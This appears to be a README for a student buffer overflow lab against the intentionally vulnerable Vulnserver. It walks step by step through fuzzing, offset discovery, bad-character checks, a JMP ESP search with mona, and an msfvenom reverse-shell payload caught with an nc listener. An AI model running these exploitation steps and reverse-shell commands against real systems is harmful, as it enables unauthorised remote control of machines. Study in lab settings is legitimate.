**WHAT IS BUFFER OVERFLOW ?** 

Buffers are memory storage regions that temporarily hold data while it is being transferred from one location to another. A buffer overflow (or buffer overrun) occurs when the volume of data exceeds the storage capacity of the memory buffer. As a result, the program attempting to write the data to the buffer overwrites adjacent memory locations.


**What is a Buffer Overflow Attack**

Attackers exploit buffer overflow issues by overwriting the memory of an application. This changes the execution path of the program, triggering a response that damages files or exposes private information. For example, an attacker may introduce extra code, sending new instructions to the application to gain access to IT systems. If attackers know the memory layout of a program, they can intentionally feed input that the buffer cannot store, and overwrite areas that hold executable code, replacing it with their own code. For example, an attacker can overwrite a pointer (an object that points to another area in memory) and point it to an exploit payload, to gain control over the program.


In my code, you can use Buffer Overflow vulnerability to exploit target machine and gain access to its directories and datas by directing External Instruction Pointer to your backdoor code.

USAGE(Example for you to try it out) : 
```
1-) Download Vulnserver and install it on the vulnerable machine
2-) Download Immunity Debugger and install it on the vulnerable machine
3-) Run both as administrator (Don't forget to restart both always when Vulnserver crashed because of our tests)
4-) In Immunity Debugger press the RUN icon above
5-) python3 fuzzing.py : run it and find out at what step it gets stuck (it gives a number in the 2000s, you can notice plus or minus, so accept 3000)
6-) Enter cd /usr/share/metasploit-framework/tools/exploit/ and run the code ./pattern_create.rb -l 3000 so that a hexadec text consisting of 3000 letters and         numbers is created in the terminal. Copy this and assign it to the patternCreated variables in offset.py
7-) python3 offset.py : Run and go to Immunity debugger. Get the value next to EIP in the section that says Registers (Mine was 386F4337 for example)
8-) ./pattern_offset.rb -l 3000 -q 386F4337 : Run this code and find exactly which letter or unit it gives error
9-) python3 badcharacters.py : Run and go to Immunity Debugger. Right click on the ESP value in the registers and select Follow in Dump.
    Then at the bottom left, there are Hex Dump values starting from 01 to FF. See if there is any loss of value there. If it is missing, it means that the           missing value is a bad character, so never use it in the shell script we will write.
10-) Download mona to Immunity Debbuger (corelan/mona github) and put the mona.py we downloaded into PyCommands in the folder where Immunity Debugger is                installed. Then run VulnServer and Immunity Debugger and write the code to bottom (like terminal place) :
     !mona modules : Find the module with false values there (I chose essfunc.dll) and try to find JUMP ESP(can vary different according to the situation. Look        for mor info at https://www.abatchy.com/2017/05/jumping-to-shellcode.html) code in it, if you can find it you can use this module for exploit.
11-) To the ID(Immunity Debugger) terminal: !mona find -s "\xff\xe4"(JUMP ESP hex code) -m essfunc.dll(Module we think might be Vulnerable)
12-) Try to pick any of the incoming results and take 2 by 2 in reverse to be suitable for x86 at the end of stringToSend in bfexploit.py (I'm adding it as            625011af = \xaf\x11\x50\x62 to the end of stringToSend)
13-) Type in the terminal : msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.10 LPORT=4444 EXITFUNC=thread -fc -a x86 -b "\x00"(we need to write all the bad          characters we detected before) and copy a long hex code that comes out up to ; with quotes. Then we add that exploit to bfexploit.py as an overFlowPayload        string and add that string to the end of stringToSend.
     (Before I add overflowpaylaod to the last part of stringToSend, I write the noop assembly code between the two of them. A pair between xaf and overfl. is          more beneficial for the system. It increases the possibility of working. If we have a byte limit problem, it may not be added)
14-) While Vulnserver is running, we leave Linux Terminal -> nc -nvlp 4444 running
15-) We run python3 bfexploit.py : Finally Happy End! You gain control on the target server.
```
DO NOT FORGET TO CHANGE mySocket.connect(("YOUR TARGET MACHINE'S IP",9999)) on every one of your .py file
